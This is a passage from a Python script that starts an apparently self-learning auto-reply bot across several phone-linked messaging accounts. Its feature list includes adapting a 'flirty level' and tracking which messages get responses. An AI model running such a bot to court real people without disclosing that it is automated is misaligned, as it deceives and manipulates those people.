        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        learned = "✓" if str(acc['id']) in learning_data else " "
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status} [Learned:{learned}]')
    
    print('='*70)
    print('🚀 SELF-LEARNING FEATURES:')
    print('   • Learns from every conversation')
    print('   • Evolves personality based on what works')
    print('   • Remembers user preferences per user')
    print('   • Tracks successful vs ignored messages')
    print('   • Adapts flirty level based on responses')
    print('   • Learns new phrases from users')
    print('   • Hourly personality evolution')
    print('   • Tracks emoji effectiveness')
    print('='*70 + '\n')
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start auto-reply
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
